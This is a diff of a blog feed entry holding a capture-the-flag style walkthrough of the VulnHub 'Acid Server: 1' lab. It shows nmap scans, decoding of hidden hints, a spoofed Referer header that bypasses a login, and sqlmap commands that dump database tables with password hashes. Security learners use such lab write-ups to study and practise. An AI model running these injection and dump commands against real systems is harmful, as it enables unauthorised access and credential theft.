@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Acid | 0x73696e65]]></title>
   <link href="http://73696e65.github.io/blog/categories/acid/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-12-15T09:19:52+01:00</updated>
+  <updated>2015-12-15T09:29:03+01:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -21,196 +21,126 @@
     <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/acid-server-1,125/">Acid Server: 1</a></p>
 
 <p>We received the IP address 192.168.80.158 for the vulnerable image. Nmap output for TCP scan:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap -sT -p- 192.168.80.158 -sV&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-04-29 13:45 CEST
-</span><span class='line'>Nmap scan report for 192.168.80.158
-</span><span class='line'>Host is up (0.00045s latency).
-</span><span class='line'>Not shown: 65534 closed ports
-</span><span class='line'>PORT      STATE SERVICE VERSION
-</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
-</span><span class='line'>MAC Address: 00:0C:29:36:7B:18 (VMware)</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+root@kali32:~# nmap -sT -p- 192.168.80.158 -sV</p>
+
+<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-04-29 13:45 CEST
+Nmap scan report for 192.168.80.158
+Host is up (0.00045s latency).
+Not shown: 65534 closed ports
+PORT      STATE SERVICE VERSION
+33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
+MAC Address: 00:0C:29:36:7B:18 (VMware)
+{% endcodeblock %}</p>
 
 <p>We found the web server. There was a hex value as the last line of the index page:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# curl &lt;a href="http://192.168.80.158:33447/">http://192.168.80.158:33447/&lt;/a>
-</span><span class='line'>[ .. snip ..]&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;!--0x643239334c6d70775a773d3d-->
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+root@kali32:~# curl <a href="http://192.168.80.158:33447/">http://192.168.80.158:33447/</a>
+[ .. snip ..]</p>
+
+<!--0x643239334c6d70775a773d3d-->
+
+
+<p>{% endcodeblock %}</p>
 
 <p>Converting in python:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# python&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;blockquote>&lt;blockquote>&lt;blockquote>&lt;p>s = &lsquo;643239334c6d70775a773d3d&rsquo;&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>s.decode(&lsquo;hex&rsquo;)
-</span><span class='line'>&lsquo;d293LmpwZw==&rsquo;&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>import base64&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>base64.b64decode(s.decode(&lsquo;hex&rsquo;))
-</span><span class='line'>&lsquo;wow.jpg&rsquo;</span></code></pre></td></tr></table></div></figure></p></blockquote></blockquote></blockquote>
+{% codeblock %}
+root@kali32:~# python</p>
+
+<blockquote><blockquote><blockquote><p>s = &lsquo;643239334c6d70775a773d3d&rsquo;</p>
+
+<p>s.decode(&lsquo;hex&rsquo;)
+&lsquo;d293LmpwZw==&rsquo;</p>
+
+<p>import base64</p>
+
+<p>base64.b64decode(s.decode(&lsquo;hex&rsquo;))
+&lsquo;wow.jpg&rsquo;
+{% endcodeblock %}</p></blockquote></blockquote></blockquote>
 
 <p>We downloaded the <a href="http://192.168.80.158:33447/images/wow.jpg">picture</a> and found another hex string:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# strings wow.jpg&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+root@kali32:~# strings wow.jpg</p>
 
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# python&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;blockquote>&lt;blockquote>&lt;blockquote>&lt;p>import re
-</span><span class='line'>s = &lsquo;37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34&rsquo;&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>re.sub(&lsquo;:&rsquo;, &lsquo;&rsquo;, s).decode(&lsquo;hex&rsquo;)
-</span><span class='line'>&lsquo;7aee0f6d588ed9905ee37f16a7c610d4&rsquo;</span></code></pre></td></tr></table></div></figure></p></blockquote></blockquote></blockquote>
+<p>37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34
+{% endcodeblock %}</p>
+
+<p>{% codeblock %}
+root@kali32:~# python</p>
+
+<blockquote><blockquote><blockquote><p>import re
+s = &lsquo;37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34&rsquo;</p>
+
+<p>re.sub(&lsquo;:&rsquo;, &lsquo;&rsquo;, s).decode(&lsquo;hex&rsquo;)
+&lsquo;7aee0f6d588ed9905ee37f16a7c610d4&rsquo;
+{% endcodeblock %}</p></blockquote></blockquote></blockquote>
 
 <p>Googling this MD5 hash, we found out that it represents the value <code>63425</code>:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# echo -n 63425 | md5sum
-</span><span class='line'>7aee0f6d588ed9905ee37f16a7c610d4  -</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+root@kali32:~# echo -n 63425 | md5sum
+7aee0f6d588ed9905ee37f16a7c610d4  -
+{% endcodeblock %}</p>
 
 <p>After a few minutes of waiting, the UDP scan finished, but we found only NTP server listening:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 192.168.80.158 -sU
-</span><span class='line'>&hellip;
-</span><span class='line'>PORT    STATE SERVICE
-</span><span class='line'>123/udp open  ntp</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+root@kali32:~# nmap 192.168.80.158 -sU
+&hellip;
+PORT    STATE SERVICE
+123/udp open  ntp
+{% endcodeblock %}</p>
 
 <p>Reading the page title (or dirb tool) reveals an interesting URL: <a href="http://192.168.80.158:33447/Challenge/">http://192.168.80.158:33447/Challenge/</a></p>
 
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# curl -s &lt;a href="http://192.168.80.158:33447/Challenge/index.php">http://192.168.80.158:33447/Challenge/index.php&lt;/a> | head -1
-</span><span class='line'>&lt;!DOCTYPE gkg.qvpn html>
-</span><span class='line'>&hellip;&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;blockquote>&lt;blockquote>&lt;blockquote>&lt;p>codecs.encode(&lsquo;gkg.qvpn&rsquo;, &lsquo;rot13&rsquo;)
-</span><span class='line'>&lsquo;txt.dica&rsquo;&lt;/p>&lt;/blockquote>&lt;/blockquote>&lt;/blockquote>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root@kali32:~# curl -s &lt;a href="http://192.168.80.158:33447/Challenge/acid.txt">http://192.168.80.158:33447/Challenge/acid.txt&lt;/a>
-</span><span class='line'>/protected_page.php</span></code></pre></td></tr></table></div></figure></p>
+<p>{% codeblock %}
+root@kali32:~# curl -s <a href="http://192.168.80.158:33447/Challenge/index.php">http://192.168.80.158:33447/Challenge/index.php</a> | head -1
+&lt;!DOCTYPE gkg.qvpn html>
+&hellip;</p>
+
+<blockquote><blockquote><blockquote><p>codecs.encode(&lsquo;gkg.qvpn&rsquo;, &lsquo;rot13&rsquo;)
+&lsquo;txt.dica&rsquo;</p></blockquote></blockquote></blockquote>
+
+<p>root@kali32:~# curl -s <a href="http://192.168.80.158:33447/Challenge/acid.txt">http://192.168.80.158:33447/Challenge/acid.txt</a>
+/protected_page.php
+{% endcodeblock %}</p>
 
 <p>We had no further access for <code>/protected_page.php</code>, but the first idea that we had was a referrer check. After verifying by spoofing this value:</p>
 
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>GET /Challenge/protected_page.php HTTP/1.1
-</span><span class='line'>Host: 192.168.80.158:33447
-</span><span class='line'>Referer: <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://192.168.80.158:33447/Challenge/includes/process_login.php&quot;</span><span class="nt">&gt;</span>http://192.168.80.158:33447/Challenge/includes/process_login.php<span class="nt">&lt;/a&gt;</span>
-</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<span class="nt">&lt;em&gt;</span>/<span class="nt">&lt;/em&gt;</span>;q=0.8
-</span><span class='line'>Accept-Language: en-US,en;q=0.5
-</span><span class='line'>Accept-Encoding: gzip, deflate
-</span><span class='line'>DNT: 1
-</span><span class='line'>Cookie: sec_session_id=a2gico0b4hgkd0e2av9k3qh8m0
-</span><span class='line'>Connection: keep-alive<span class="nt">&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nt">&lt;p&gt;</span>..<span class="nt">&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nt">&lt;p&gt;</span><span class="ni">&amp;lt;</span>!DOCTYPE html&gt;
-</span><span class='line'><span class="nt">&lt;html&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;head&gt;</span>
-</span><span class='line'>        <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">&quot;UTF-8&quot;</span><span class="nt">&gt;</span>
-</span><span class='line'>        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;css/style.css&quot;</span><span class="nt">&gt;</span>
-</span><span class='line'>        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;styles/main.css&quot;</span> <span class="nt">/&gt;</span>
-</span><span class='line'>        <span class="nt">&lt;title&gt;</span>Secure Login: Protected Page<span class="nt">&lt;/title&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;/head&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;body&gt;</span>
-</span><span class='line'>         <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;wrapper&quot;</span><span class="nt">&gt;</span>
-</span><span class='line'>                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;container&quot;</span><span class="nt">&gt;&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nt">&lt;pre&gt;&lt;code&gt;</span>                                            <span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span> <span class="ni">&amp;lt;</span>h1<span class="ni">&amp;gt;</span>Congrats..! You have bypassed User Panel Successfully.<span class="ni">&amp;lt;</span>/h1<span class="ni">&amp;gt;</span> <span class="ni">&amp;lt;</span>br<span class="ni">&amp;gt;</span>
-</span><span class='line'>                    <span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;&amp;lt;</span>h3<span class="ni">&amp;gt;</span>There is long way to go :-) <span class="ni">&amp;lt;</span>a href=&quot;hacked.php&quot;<span class="ni">&amp;gt;</span>Click Here to Proceed Further<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>.<span class="ni">&amp;lt;</span>/h3<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
-</span><span class='line'>
-</span><span class='line'>                    <span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;&amp;lt;</span>h3<span class="ni">&amp;gt;</span>If you are done, please <span class="ni">&amp;lt;</span>a href=&quot;includes/logout.php&quot;<span class="ni">&amp;gt;</span>log out<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>.<span class="ni">&amp;lt;</span>/h3<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
-</span><span class='line'>
-</span><span class='line'>                        <span class="ni">&amp;lt;</span>/body<span class="ni">&amp;gt;</span>
-</span><span class='line'><span class="nt">&lt;/code&gt;&lt;/pre&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nt">&lt;p&gt;&lt;/html&gt;</span>
-</span><span class='line'>..
-</span></code></pre></td></tr></table></div></figure></p>
+<p>{% codeblock lang:html %}
+GET /Challenge/protected_page.php HTTP/1.1
+Host: 192.168.80.158:33447
+Referer: <a href="http://192.168.80.158:33447/Challenge/includes/process_login.php">http://192.168.80.158:33447/Challenge/includes/process_login.php</a>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Cookie: sec_session_id=a2gico0b4hgkd0e2av9k3qh8m0
+Connection: keep-alive</p>
+
+<p>..</p>
+
+<p>&lt;!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <link rel="stylesheet" href="css/style.css">
+        <link rel="stylesheet" href="styles/main.css" />
+        <title>Secure Login: Protected Page</title>
+    </head>
+    <body>
+         <div class="wrapper">
+                <div class="container"></p>
+
+<pre><code>                                            &lt;p&gt; &lt;h1&gt;Congrats..! You have bypassed User Panel Successfully.&lt;/h1&gt; &lt;br&gt;
+                    &lt;p&gt;&lt;h3&gt;There is long way to go :-) &lt;a href="hacked.php"&gt;Click Here to Proceed Further&lt;/a&gt;.&lt;/h3&gt;&lt;/p&gt;
+
+                    &lt;p&gt;&lt;h3&gt;If you are done, please &lt;a href="includes/logout.php"&gt;log out&lt;/a&gt;.&lt;/h3&gt;&lt;/p&gt;
+
+                        &lt;/body&gt;
+</code></pre>
+
+<p></html>
+..
+{% endcodeblock %}</p>
 
 <p>Proceeding further, there are a few hints for sql injection, but nothing that we have tried worked:
 <a href="http://192.168.80.158:33447/Challenge/hacked.php?id=33&amp;add=Add+ID">http://192.168.80.158:33447/Challenge/hacked.php?id=33&amp;add=Add+ID</a></p>
@@ -219,212 +149,124 @@
 Suite Scanner revealed, that the parameter ID is vulnerable, when it&rsquo;s sent in POST
 method:</p>
 
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>POST /Challenge/hacked.php?add=Add_ID HTTP/1.1
-</span><span class='line'>Host: 192.168.80.158:33447
-</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
-</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<span class="nt">&lt;em&gt;</span>/<span class="nt">&lt;/em&gt;</span>;q=0.8
-</span><span class='line'>Accept-Language: en-US,en;q=0.5
-</span><span class='line'>Accept-Encoding: gzip, deflate
-</span><span class='line'>DNT: 1
-</span><span class='line'>Referer: <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://192.168.80.158:33447/Challenge/hacked.php&quot;</span><span class="nt">&gt;</span>http://192.168.80.158:33447/Challenge/hacked.php<span class="nt">&lt;/a&gt;</span>
-</span><span class='line'>Cookie: sec_session_id=1mo7qhj43ul3d90kin24am4531
-</span><span class='line'>Connection: keep-alive
-</span><span class='line'>Content-Type: application/x-www-form-urlencoded
-</span><span class='line'>Content-Length: 28<span class="nt">&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nt">&lt;p&gt;</span>id=1&#39;
-</span><span class='line'><span class="ni">&amp;hellip;</span><span class="nt">&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nt">&lt;p&gt;</span>Could not enter data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near <span class="ni">&amp;lsquo;</span>&#39;1<span class="ni">&amp;rsquo;&amp;lsquo;</span>))<span class="ni">&amp;rsquo;</span> at line
-</span></code></pre></td></tr></table></div></figure></p>
+<p>{% codeblock lang:html %}
+POST /Challenge/hacked.php?add=Add_ID HTTP/1.1
+Host: 192.168.80.158:33447
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: <a href="http://192.168.80.158:33447/Challenge/hacked.php">http://192.168.80.158:33447/Challenge/hacked.php</a>
+Cookie: sec_session_id=1mo7qhj43ul3d90kin24am4531
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28</p>
+
+<p>id=1&#8217;
+&hellip;</p>
+
+<p>Could not enter data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;&#8217;1&rsquo;&lsquo;))&rsquo; at line
+{% endcodeblock %}</p>
 
 <p>Now we can use sqlmap and retrieve some useful information:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u &ldquo;&lt;a href="http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID">http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID&lt;/a>&rdquo; &ndash;cookie=&ldquo;sec_session_id=1mo7qhj43ul3d90kin24am4531&rdquo; -p id &ndash;method=POST &ndash;data=&ldquo;id=1&rdquo; -a
-</span><span class='line'>&hellip;&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>web server operating system: Linux Ubuntu
-</span><span class='line'>web application technology: Apache 2.4.10
-</span><span class='line'>back-end DBMS operating system: Linux Ubuntu
-</span><span class='line'>back-end DBMS: MySQL 5.0
-</span><span class='line'>banner:    &lsquo;5.6.25-0ubuntu0.15.04.1&rsquo;
-</span><span class='line'>current user:    &lsquo;root@localhost&rsquo;
-</span><span class='line'>current database:    &lsquo;secure_login&rsquo;
-</span><span class='line'>hostname:    &lsquo;acid&rsquo;
-</span><span class='line'>current user is DBA:    True&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root@kali32:~# sqlmap -u &ldquo;&lt;a href="http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID">http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID&lt;/a>&rdquo; &ndash;cookie=&ldquo;sec_session_id=1mo7qhj43ul3d90kin24am4531&rdquo; -p id &ndash;method=POST &ndash;data=&ldquo;id=1&rdquo;  -D secure_login &ndash;tables &ndash;columns &ndash;dump&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# cat success.csv
-</span><span class='line'>id,VXNlcnMudHh0,Y0dGemN5NTBlSFE9
-</span><span class='line'>1,lol,lol1&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo VXNlcnMudHh0 | base64 -d
-</span><span class='line'>Users.txt&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo Y0dGemN5NTBlSFE9 | base64 -d
-</span><span class='line'>cGFzcy50eHQ=&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo cGFzcy50eHQ= | base64 -d
-</span><span class='line'>pass.txt&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# cat members.csv
-</span><span class='line'>id,salt,email,username,password
-</span><span class='line'>1,f9aab579fc1b41ed0c44fe4ecdbfcdb4cb99b9023abb241a6db833288f4eea3c02f76e0d35204a8695077dcf81932aa59006423976224be0390395bae152d4ef,test@example.com,test_user,00807432eae173f652f2064bdca1b61b290b52d40e429a7d295d76a71084aa96c0233b82f1feac45529e0726559645acaed6f3ae58a286b9f075916ebf66cacc
-</span><span class='line'>2,8a93f1fa3259a90d9cfafcc1ef43dfc2d0a2d6cba0e8f2f9c23ae6b701364aa278bf5629585c3663ae3df5c7a3734ca6af4019d7ef897f45cb0acc056c3e735f,acid@gmail.com,Acid,53b9bd4416ec581838c4bde217e09f1206b94cdb95475cddda862894f4dbbeec5ceacc2e116a64cb56d8384404738c5fd16478e0266962eeb3b61da1918d5931
-</span><span class='line'>3,be02c5499ba4fd559dc7809a7fae01d6f251e781dbdf5a7af2c7bca320006f1a5275d8020d5c539d116e54b1bf775018349c721151d9111ad1c3da8f6b9c9697,saman.j.l33t@gmail.com,saman,c124191d7a267cb2b83b2c59a30b2e388b77f13955340015462bffc0d90cfa7b402ecb8e3fc82717f22b127c98a4afa9ed4f3661d824c6c57a1490f9963d9234
-</span><span class='line'>4,c72ccb8eb5ac065eca5341ff8ed296648b92bc99b511300a4525e8c17679ecce06e8038e582b539acf17008f9fd3a394d912f1158ef7f3d16d5f66ba32ca18bb,vik.create@gmail.com,Vivek,fb8db054a75254633052d951002065109cd96fe990bf5a5d5bd1581d3578235a69224784b29870046d21d95567cdfe292221fbabce17201b23ca0fd5ee4fa20e</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+root@kali32:~# sqlmap -u &ldquo;<a href="http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID">http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID</a>&rdquo; &ndash;cookie=&ldquo;sec_session_id=1mo7qhj43ul3d90kin24am4531&rdquo; -p id &ndash;method=POST &ndash;data=&ldquo;id=1&rdquo; -a
+&hellip;</p>
+
+<p>web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.10
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: MySQL 5.0
+banner:    &lsquo;5.6.25-0ubuntu0.15.04.1&rsquo;
+current user:    &lsquo;root@localhost&rsquo;
+current database:    &lsquo;secure_login&rsquo;
+hostname:    &lsquo;acid&rsquo;
+current user is DBA:    True</p>
+
+<p>root@kali32:~# sqlmap -u &ldquo;<a href="http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID">http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID</a>&rdquo; &ndash;cookie=&ldquo;sec_session_id=1mo7qhj43ul3d90kin24am4531&rdquo; -p id &ndash;method=POST &ndash;data=&ldquo;id=1&rdquo;  -D secure_login &ndash;tables &ndash;columns &ndash;dump</p>
+
+<p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# cat success.csv
+id,VXNlcnMudHh0,Y0dGemN5NTBlSFE9
+1,lol,lol1</p>
+
+<p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo VXNlcnMudHh0 | base64 -d
+Users.txt</p>
+
+<p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo Y0dGemN5NTBlSFE9 | base64 -d
+cGFzcy50eHQ=</p>
+
+<p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo cGFzcy50eHQ= | base64 -d
+pass.txt</p>
+
+<p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# cat members.csv
+id,salt,email,username,password
+1,f9aab579fc1b41ed0c44fe4ecdbfcdb4cb99b9023abb241a6db833288f4eea3c02f76e0d35204a8695077dcf81932aa59006423976224be0390395bae152d4ef,test@example.com,test_user,00807432eae173f652f2064bdca1b61b290b52d40e429a7d295d76a71084aa96c0233b82f1feac45529e0726559645acaed6f3ae58a286b9f075916ebf66cacc
+2,8a93f1fa3259a90d9cfafcc1ef43dfc2d0a2d6cba0e8f2f9c23ae6b701364aa278bf5629585c3663ae3df5c7a3734ca6af4019d7ef897f45cb0acc056c3e735f,acid@gmail.com,Acid,53b9bd4416ec581838c4bde217e09f1206b94cdb95475cddda862894f4dbbeec5ceacc2e116a64cb56d8384404738c5fd16478e0266962eeb3b61da1918d5931
+3,be02c5499ba4fd559dc7809a7fae01d6f251e781dbdf5a7af2c7bca320006f1a5275d8020d5c539d116e54b1bf775018349c721151d9111ad1c3da8f6b9c9697,saman.j.l33t@gmail.com,saman,c124191d7a267cb2b83b2c59a30b2e388b77f13955340015462bffc0d90cfa7b402ecb8e3fc82717f22b127c98a4afa9ed4f3661d824c6c57a1490f9963d9234
+4,c72ccb8eb5ac065eca5341ff8ed296648b92bc99b511300a4525e8c17679ecce06e8038e582b539acf17008f9fd3a394d912f1158ef7f3d16d5f66ba32ca18bb,vik.create@gmail.com,Vivek,fb8db054a75254633052d951002065109cd96fe990bf5a5d5bd1581d3578235a69224784b29870046d21d95567cdfe292221fbabce17201b23ca0fd5ee4fa20e
+{% endcodeblock %}</p>
 
